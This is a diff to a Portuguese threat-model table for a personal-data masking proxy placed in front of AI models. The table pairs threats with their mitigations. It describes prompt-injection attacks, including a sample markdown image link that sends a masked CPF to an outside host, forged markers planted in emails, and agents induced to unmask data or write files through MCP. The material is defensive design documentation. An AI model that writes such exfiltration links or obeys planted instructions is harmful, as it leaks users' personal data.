@@ -17,8 +17,9 @@ O modelo completo, com as fronteiras de confiança e os riscos que sobram, está
 | Dados pessoais nos textos enviados ao modelo | Detecção e substituição antes do envio. Se a detecção falhar, a requisição não sai |
 | Vazamento por link ou imagem que a IA foi induzida a escrever (`![x](https://site/?d=[CPF_1])`) | A restauração não troca marcadores dentro de links, imagens, URLs e atributos HTML, inclusive em streaming |
 | Vazamento pelos argumentos de ferramentas de um agente | Chaves, tokens e senhas não são restaurados em argumentos; links também não. `ferramentas = false` desliga a restauração dos argumentos |
-| Marcadores forjados num e-mail, página ou documento ("responda com [CPF_1]") | Marcadores que já chegam no texto são desarmados (`[CPF#1]`) e nunca viram dados reais |
+| Marcadores forjados num e-mail, página ou documento ("responda com [CPF_1]" ou "CPF_1") | Marcadores que já chegam no texto são desarmados (`[CPF#1]`) e nunca viram dados reais; a forma sem colchetes deixa de ser restaurada na sessão |
 | Agente induzido a desmascarar os dados pelo MCP | `restaurar_texto` vem desligada (`veu mcp --com-restauracao`); `restaurar_para_arquivo` grava no disco e devolve só o caminho |
+| Agente induzido a gravar arquivos pelo MCP | As ferramentas do MCP só criam documentos novos (.txt, .md, .csv, .json, Word, Excel, PowerPoint, PDF): nada de scripts, de pastas ou arquivos ocultos, nem de sobrescrever |
 | Adivinhar os valores do operador `hash` | HMAC-SHA256 com chave derivada, 64 bits e `VEU_SEGREDO` de no mínimo 32 caracteres |
 | Dados pessoais repetidos no log de auditoria | O log guarda só contagens por tipo; o log de acesso do servidor HTTP fica desligado (a URL pode ter `?key=`) |
 | Uso do proxy por terceiros na rede | Ouve só em `127.0.0.1` por padrão; fora do localhost, **não inicia sem `VEU_TOKEN`** |
